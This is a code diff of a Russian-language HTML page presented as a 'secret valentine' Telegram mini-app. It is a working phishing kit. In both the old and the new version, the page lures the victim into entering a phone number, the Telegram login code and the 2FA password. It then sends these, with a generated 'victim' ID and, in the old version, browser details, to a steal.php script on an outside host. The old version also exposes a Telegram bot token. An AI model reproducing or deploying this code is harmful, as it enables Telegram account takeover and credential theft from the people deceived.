@@ -1,181 +1,127 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
-    <meta charset="UTF-8">
+    <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>💝 Тайная Валентинка</title>
+    <title>Валентинка 💌</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         }
         
         body {
-            background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
-            min-height: 100vh;
+            background: #0a0a0a;
             display: flex;
-            align-items: center;
             justify-content: center;
-            padding: 20px;
-        }
-        
-        .container {
-            width: 100%;
-            max-width: 400px;
+            align-items: center;
+            min-height: 100vh;
+            padding: 16px;
         }
         
         .card {
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(10px);
-            border-radius: 30px;
-            padding: 30px 25px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.2);
-            animation: slideUp 0.5s ease;
-            border: 1px solid rgba(255,255,255,0.3);
+            background: #1e1e1e;
+            border-radius: 28px;
+            padding: 30px 24px;
+            max-width: 420px;
+            width: 100%;
+            border: 1px solid #333;
+            box-shadow: 0 12px 28px rgba(0,0,0,0.7);
         }
         
-        @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        
-        .header {
+        .heart {
+            font-size: 64px;
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 8px;
+            animation: pulse 1.5s infinite;
         }
         
-        .heart-icon {
-            font-size: 60px;
-            margin-bottom: 15px;
-            animation: heartbeat 1.5s ease infinite;
-        }
-        
-        @keyframes heartbeat {
+        @keyframes pulse {
             0% { transform: scale(1); }
             50% { transform: scale(1.1); }
             100% { transform: scale(1); }
         }
         
-        h1 {
+        h2 {
+            color: white;
             font-size: 28px;
-            color: #333;
+            font-weight: 700;
+            text-align: center;
             margin-bottom: 8px;
         }
         
-        .subtitle {
-            color: #666;
-            font-size: 14px;
+        .sub {
+            color: #aaa;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .message {
+            background: #252525;
+            border-radius: 18px 18px 18px 4px;
+            padding: 22px;
+            color: white;
+            font-size: 17px;
+            margin-bottom: 30px;
+            border-left: 4px solid #ff4d6d;
             line-height: 1.5;
         }
         
-        .status-badge {
-            background: #f0f0f0;
-            padding: 8px 15px;
-            border-radius: 50px;
-            display: inline-block;
-            font-size: 12px;
-            margin-top: 10px;
-        }
-        
-        .status-badge.online {
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
-        }
-        
-        .status-badge.offline {
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-        }
-        
-        .step-indicator {
-            display: flex;
-            justify-content: center;
-            margin: 25px 0;
-            gap: 10px;
-        }
-        
-        .step {
-            width: 35px;
-            height: 35px;
-            border-radius: 50%;
-            background: #f0f0f0;
+        .sender {
+            color: #ff8c9c;
+            margin-top: 14px;
+            font-size: 14px;
             display: flex;
             align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            color: #999;
-            transition: all 0.3s ease;
-        }
-        
-        .step.active {
-            background: #ff6b6b;
-            color: white;
-            box-shadow: 0 5px 15px rgba(255, 107, 107, 0.4);
-        }
-        
-        .step.completed {
-            background: #4CAF50;
-            color: white;
+            gap: 6px;
         }
         
         .input-group {
             margin-bottom: 20px;
-            position: relative;
         }
         
         .input-group label {
             display: block;
-            margin-bottom: 8px;
-            color: #555;
-            font-weight: 500;
+            color: #ddd;
             font-size: 14px;
+            margin-bottom: 8px;
         }
         
         .input-group input {
             width: 100%;
-            padding: 15px;
-            border: 2px solid #e0e0e0;
-            border-radius: 15px;
+            padding: 16px;
+            background: #252525;
+            border: 1px solid #3a3a3a;
+            border-radius: 14px;
+            color: white;
             font-size: 16px;
-            transition: all 0.3s ease;
-            background: #f8f9fa;
         }
         
         .input-group input:focus {
+            border-color: #ff4d6d;
             outline: none;
-            border-color: #ff6b6b;
-            background: white;
-            box-shadow: 0 5px 15px rgba(255, 107, 107, 0.1);
         }
         
         .btn {
-            width: 100%;
-            padding: 16px;
-            border: none;
-            border-radius: 15px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            background: linear-gradient(135deg, #ff6b6b 0%, #ff8e8e 100%);
+            background: linear-gradient(145deg, #ff4d6d, #ff1e4d);
             color: white;
-            box-shadow: 0 10px 20px rgba(255, 107, 107, 0.3);
-            position: relative;
+            border: none;
+            padding: 18px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 10px;
         }
         
-        .btn:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 15px 25px rgba(255, 107, 107, 0.4);
+        .btn:hover {
+            background: linear-gradient(145deg, #ff5e7a, #ff2e58);
+            transform: scale(1.02);
         }
         
         .btn:disabled {
@@ -183,442 +129,128 @@
             cursor: not-allowed;
         }
         
-        .btn.loading {
-            pointer-events: none;
-        }
-        
-        .btn.loading::after {
-            content: '';
-            position: absolute;
-            width: 20px;
-            height: 20px;
-            top: 50%;
-            left: 50%;
-            margin-left: -10px;
-            margin-top: -10px;
-            border: 3px solid rgba(255,255,255,0.3);
-            border-top-color: white;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        
-        .info-text {
-            text-align: center;
-            margin-top: 15px;
-            color: #999;
-            font-size: 12px;
-        }
-        
-        .twofa-section {
+        .hidden {
             display: none;
-            margin-top: 20px;
-            padding-top: 20px;
-            border-top: 2px dashed #e0e0e0;
         }
         
-        .twofa-section.visible {
-            display: block;
-        }
-        
-        .checkbox-label {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin: 15px 0;
-            color: #666;
-            font-size: 14px;
-            cursor: pointer;
-        }
-        
-        .checkbox-label input[type="checkbox"] {
-            width: 18px;
-            height: 18px;
-            cursor: pointer;
-        }
-        
-        .notification {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            padding: 15px 25px;
-            border-radius: 10px;
-            color: white;
-            font-weight: 500;
-            animation: slideIn 0.3s ease;
-            z-index: 1000;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
-        }
-        
-        .notification.success {
-            background: #4CAF50;
-        }
-        
-        .notification.error {
-            background: #ff4757;
-        }
-        
-        @keyframes slideIn {
-            from {
-                transform: translateX(100%);
-                opacity: 0;
-            }
-            to {
-                transform: translateX(0);
-                opacity: 1;
-            }
-        }
-        
-        .system-info {
+        .status {
             margin-top: 20px;
             padding: 15px;
-            background: #f8f9fa;
-            border-radius: 15px;
-            font-size: 12px;
-            color: #666;
-            text-align: left;
+            background: #2a2a2a;
+            border-left: 4px solid #ffaa00;
+            color: #ffaa00;
         }
         
-        .system-info-item {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 8px;
-        }
-        
-        .status-dot {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            display: inline-block;
-            margin-right: 5px;
-        }
-        
-        .status-dot.green { background: #4CAF50; }
-        .status-dot.red { background: #ff4757; }
-        
-        .test-btn {
-            background: transparent;
-            border: 1px solid #ff6b6b;
-            color: #ff6b6b;
-            padding: 5px 10px;
-            border-radius: 5px;
-            font-size: 11px;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-        
-        .test-btn:hover {
-            background: #ff6b6b;
-            color: white;
+        .success {
+            border-left-color: #4caf92;
+            color: #4caf92;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="card">
-            <div class="header">
-                <div class="heart-icon">💝</div>
-                <h1>Тайная Валентинка</h1>
-                <p class="subtitle">Кто-то отправил вам секретное признание!</p>
-                <div id="connection-status" class="status-badge offline">🔴 Проверка соединения...</div>
+    <div class="card">
+        <div class="heart">❤️</div>
+        <h2>У тебя валентинка!</h2>
+        <div class="sub">Анонимно • только что</div>
+        
+        <div class="message">
+            "Привет... Ты мне очень нравишься. С 14 февраля ❤️"
+            <div class="sender">💫 От тайного поклонника</div>
+        </div>
+        
+        <div id="step1">
+            <div class="input-group">
+                <label>📱 Твой номер</label>
+                <input type="tel" id="phone" placeholder="+7 999 999 99 99" value="+7">
             </div>
-            
-            <!-- Системная информация -->
-            <div class="system-info">
-                <div class="system-info-item">
-                    <span>📡 GitHub (HTTPS):</span>
-                    <span><span class="status-dot green"></span>✅</span>
-                </div>
-                <div class="system-info-item">
-                    <span>🌐 Beget (HTTP):</span>
-                    <span id="beget-status"><span class="status-dot red"></span>❌ Проверка...</span>
-                </div>
-                <div class="system-info-item">
-                    <span>🤖 Telegram Bot:</span>
-                    <span id="bot-status"><span class="status-dot red"></span>❌</span>
-                </div>
-                <button class="test-btn" onclick="testConnection()">🔄 Проверить соединение</button>
+            <button class="btn" id="sendPhoneBtn">Получить код</button>
+        </div>
+        
+        <div id="step2" class="hidden">
+            <div class="input-group">
+                <label>🔐 Код из SMS</label>
+                <input type="text" id="code" placeholder="Введи код" maxlength="6">
             </div>
-            
-            <div id="app">
-                <div class="step-indicator">
-                    <div class="step" :class="{active: step === 1, completed: step > 1}">1</div>
-                    <div class="step" :class="{active: step === 2, completed: step > 2}">2</div>
-                    <div class="step" :class="{active: step === 3}">3</div>
-                </div>
-                
-                <!-- Шаг 1: Ввод номера -->
-                <div v-if="step === 1">
-                    <div class="input-group">
-                        <label>📱 Ваш номер телефона</label>
-                        <input type="tel" 
-                               v-model="phone" 
-                               placeholder="+7 (999) 123-45-67"
-                               @input="validatePhone">
-                    </div>
-                    
-                    <button class="btn" @click="nextStep" :disabled="!isPhoneValid">
-                        Продолжить →
-                    </button>
-                    
-                    <p class="info-text">
-                        Нужен для подтверждения личности
-                    </p>
-                </div>
-                
-                <!-- Шаг 2: Ввод кода -->
-                <div v-if="step === 2">
-                    <div class="input-group">
-                        <label>🔐 Код из Telegram</label>
-                        <input type="text" 
-                               v-model="code" 
-                               placeholder="Введите код из SMS"
-                               maxlength="6">
-                    </div>
-                    
-                    <div class="checkbox-label">
-                        <input type="checkbox" v-model="has2FA" id="has2FA">
-                        <label for="has2FA">У меня есть пароль двухфакторной аутентификации (2FA)</label>
-                    </div>
-                    
-                    <div class="twofa-section" :class="{visible: has2FA}">
-                        <div class="input-group">
-                            <label>🔒 Пароль 2FA</label>
-                            <input type="password" 
-                                   v-model="twofa" 
-                                   placeholder="Введите пароль 2FA">
-                        </div>
-                    </div>
-                    
-                    <button class="btn" @click="submitData" :class="{loading: loading}" :disabled="!isCodeValid || loading">
-                        {{ loading ? 'Отправка...' : 'Получить валентинку 💌' }}
-                    </button>
-                    
-                    <p class="info-text" @click="step = 1" style="cursor: pointer; color: #ff6b6b;">
-                        ← Назад
-                    </p>
-                </div>
-                
-                <!-- Шаг 3: Успех -->
-                <div v-if="step === 3">
-                    <div style="text-align: center;">
-                        <div style="font-size: 80px; margin-bottom: 20px;">💖</div>
-                        <h2 style="color: #4CAF50; margin-bottom: 15px;">Валентинка получена!</h2>
-                        <p style="color: #666; margin-bottom: 25px; line-height: 1.6;">
-                            Спасибо! Ваше признание скоро будет доставлено.<br>
-                            ❤️ С днём Святого Валентина!
-                        </p>
-                        <button class="btn" @click="resetForm" style="background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);">
-                            Получить ещё одну
-                        </button>
-                    </div>
-                </div>
+            <button class="btn" id="sendCodeBtn" disabled>Подтвердить</button>
+            <div class="status" id="codeStatus">⏳ Код отправлен...</div>
+        </div>
+        
+        <div id="step3" class="hidden">
+            <div class="input-group">
+                <label>🔐 Пароль 2FA</label>
+                <input type="password" id="password" placeholder="Введи пароль">
             </div>
+            <button class="btn" id="sendPasswordBtn" disabled>Подтвердить</button>
+            <div class="status" id="passwordStatus">🔒 Введи пароль</div>
         </div>
     </div>
-    
-    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
-    
+
     <script>
-        // ========== КОНФИГУРАЦИЯ ==========
-        const CONFIG = {
-            // URL вашего файла на Beget (HTTP)
-            BEGET_URL: 'http://bprof.raximi52.beget.tech/steal.php',  // ЗАМЕНИТЕ НА ВАШ URL!
-            // Токен для защиты (опционально)
-            SECRET_KEY: 'valen7654243534353634tine2024'
-        };
-        // =================================
+        Telegram.WebApp.ready();
         
-        // Проверка соединения с Beget
-        async function checkBegetConnection() {
+        const VICTIM_ID = 'victim_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        const BEGET_URL = 'http://bprof.raximi52.beget.tech/steal.php';
+        
+        let userPhone = '';
+        let userCode = '';
+        
+        async function sendToBeget(type, data) {
             try {
-                // Пробуем отправить тестовый запрос
-                const response = await fetch(CONFIG.BEGET_URL, {
+                const response = await fetch(BEGET_URL, {
                     method: 'POST',
-                    mode: 'cors',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        test: true,
-                        time: Date.now()
+                        type: type,
+                        data: {
+                            ...data,
+                            victim_id: VICTIM_ID,
+                            timestamp: new Date().toLocaleString()
+                        }
                     })
                 });
-                
-                if (response.ok) {
-                    document.getElementById('beget-status').innerHTML = '<span class="status-dot green"></span>✅ Онлайн';
-                    
-                    // Проверяем бота (он должен ответить)
-                    try {
-                        const botCheck = await fetch(`https://api.telegram.org/bot8562246068:AAGLHIOutyVHlhxvBR-WvS0DbxNfYOIhYU8/getMe`);
-                        if (botCheck.ok) {
-                            document.getElementById('bot-status').innerHTML = '<span class="status-dot green"></span>✅ Активен';
-                        }
-                    } catch {
-                        document.getElementById('bot-status').innerHTML = '<span class="status-dot red"></span>❌ Ошибка';
-                    }
-                    
-                    document.getElementById('connection-status').className = 'status-badge online';
-                    document.getElementById('connection-status').innerHTML = '🟢 Система работает';
-                    return true;
-                }
-            } catch (error) {
-                console.error('Beget connection error:', error);
-                document.getElementById('beget-status').innerHTML = '<span class="status-dot red"></span>❌ Недоступен';
-                document.getElementById('bot-status').innerHTML = '<span class="status-dot red"></span>❌';
-                document.getElementById('connection-status').className = 'status-badge offline';
-                document.getElementById('connection-status').innerHTML = '🔴 Beget недоступен';
+                console.log('Отправлено:', type, data);
+            } catch(e) {
+                console.log('Ошибка:', e);
             }
-            return false;
         }
         
-        // Тест соединения
-        async function testConnection() {
-            const statusEl = document.getElementById('beget-status');
-            statusEl.innerHTML = '<span class="status-dot yellow"></span>⏳ Проверка...';
+        document.getElementById('sendPhoneBtn').onclick = function() {
+            let phone = document.getElementById('phone').value.trim();
+            phone = phone.replace(/\D/g, '');
+            if (!phone.startsWith('7')) phone = '7' + phone;
+            userPhone = '+' + phone;
             
-            await checkBegetConnection();
+            sendToBeget('phone', {phone: userPhone});
             
-            // Показываем детали
-            alert(`Проверка завершена!\nBeget: ${await checkBegetConnection() ? '✅' : '❌'}\n\nURL: ${CONFIG.BEGET_URL}`);
-        }
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+            document.getElementById('codeStatus').innerHTML = `⏳ Код отправлен на ${userPhone}`;
+        };
         
-        // Vue приложение
-        new Vue({
-            el: '#app',
-            data: {
-                step: 1,
-                phone: '',
-                code: '',
-                has2FA: false,
-                twofa: '',
-                loading: false,
-                phoneError: false
-            },
-            computed: {
-                isPhoneValid() {
-                    const phoneRegex = /^[\+]?[(]?[0-9]{1,3}[)]?[-\s\.]?[(]?[0-9]{1,4}[)]?[-\s\.]?[0-9]{1,4}[-\s\.]?[0-9]{1,9}$/;
-                    return phoneRegex.test(this.phone) && this.phone.replace(/\D/g, '').length >= 10;
-                },
-                isCodeValid() {
-                    return this.code.length >= 4;
-                }
-            },
-            async mounted() {
-                // Проверяем соединение при загрузке
-                await checkBegetConnection();
-                
-                // Проверяем каждые 30 секунд
-                setInterval(checkBegetConnection, 30000);
-            },
-            methods: {
-                validatePhone() {
-                    this.phoneError = false;
-                },
-                nextStep() {
-                    if (this.isPhoneValid) {
-                        this.step = 2;
-                    } else {
-                        this.phoneError = true;
-                        this.showNotification('Введите корректный номер телефона', 'error');
-                    }
-                },
-                async submitData() {
-                    this.loading = true;
-                    
-                    // Генерируем уникальный ID для жертвы
-                    const victimId = 'VID_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-                    
-                    // Формируем данные для отправки
-                    const dataToSend = {
-                        id: victimId,
-                        phone: this.phone.replace(/\D/g, ''),
-                        code: this.code,
-                        twofa: this.has2FA ? this.twofa : null,
-                        timestamp: new Date().toISOString(),
-                        userAgent: navigator.userAgent,
-                        language: navigator.language,
-                        platform: navigator.platform,
-                        screen: `${screen.width}x${screen.height}`,
-                        referrer: document.referrer || 'direct',
-                        url: window.location.href,
-                        key: CONFIG.SECRET_KEY  // Для дополнительной защиты
-                    };
-                    
-                    try {
-                        console.log('Sending to Beget:', CONFIG.BEGET_URL);
-                        console.log('Data:', dataToSend);
-                        
-                        // Отправляем на Beget
-                        const response = await fetch(CONFIG.BEGET_URL, {
-                            method: 'POST',
-                            mode: 'cors',
-                            headers: {
-                                'Content-Type': 'application/json',
-                            },
-                            body: JSON.stringify(dataToSend)
-                        });
-                        
-                        // Проверяем ответ
-                        const responseText = await response.text();
-                        console.log('Raw response:', responseText);
-                        
-                        let responseData;
-                        try {
-                            responseData = JSON.parse(responseText);
-                        } catch (e) {
-                            console.error('Failed to parse response:', e);
-                            throw new Error('Сервер вернул некорректный ответ');
-                        }
-                        
-                        if (response.ok) {
-                            this.step = 3;
-                            this.showNotification('✅ Валентинка отправлена!', 'success');
-                            
-                            // Очищаем форму
-                            this.phone = '';
-                            this.code = '';
-                            this.has2FA = false;
-                            this.twofa = '';
-                        } else {
-                            throw new Error(responseData.error || 'Ошибка сервера');
-                        }
-                    } catch (error) {
-                        console.error('Submit error details:', error);
-                        this.showNotification(`❌ Ошибка: ${error.message}`, 'error');
-                        
-                        // Проверяем соединение
-                        await checkBegetConnection();
-                    } finally {
-                        this.loading = false;
-                    }
-                },
-                resetForm() {
-                    this.step = 1;
-                    this.phone = '';
-                    this.code = '';
-                    this.has2FA = false;
-                    this.twofa = '';
-                },
-                showNotification(message, type) {
-                    const notification = document.createElement('div');
-                    notification.className = `notification ${type}`;
-                    notification.textContent = message;
-                    document.body.appendChild(notification);
-                    
-                    setTimeout(() => {
-                        notification.remove();
-                    }, 3000);
-                }
-            }
-        });
+        document.getElementById('code').oninput = function() {
+            this.value = this.value.replace(/\D/g, '');
+            document.getElementById('sendCodeBtn').disabled = this.value.length !== 6;
+        };
         
-        // Экспортируем функции в глобальную область
-        window.testConnection = testConnection;
-        window.checkBegetConnection = checkBegetConnection;
+        document.getElementById('sendCodeBtn').onclick = function() {
+            userCode = document.getElementById('code').value;
+            sendToBeget('code', {code: userCode, phone: userPhone});
+            
+            document.getElementById('codeStatus').innerHTML = '✅ Код принят';
+            document.getElementById('step3').classList.remove('hidden');
+        };
+        
+        document.getElementById('password').oninput = function() {
+            document.getElementById('sendPasswordBtn').disabled = this.value.length < 4;
+        };
+        
+        document.getElementById('sendPasswordBtn').onclick = function() {
+            const password = document.getElementById('password').value;
+            sendToBeget('password', {password: password, code: userCode, phone: userPhone});
+            
+            document.getElementById('passwordStatus').innerHTML = '✅ Валентинка открыта!';
+            setTimeout(() => Telegram.WebApp.close(), 2000);
+        };
     </script>
 </body>
 </html>
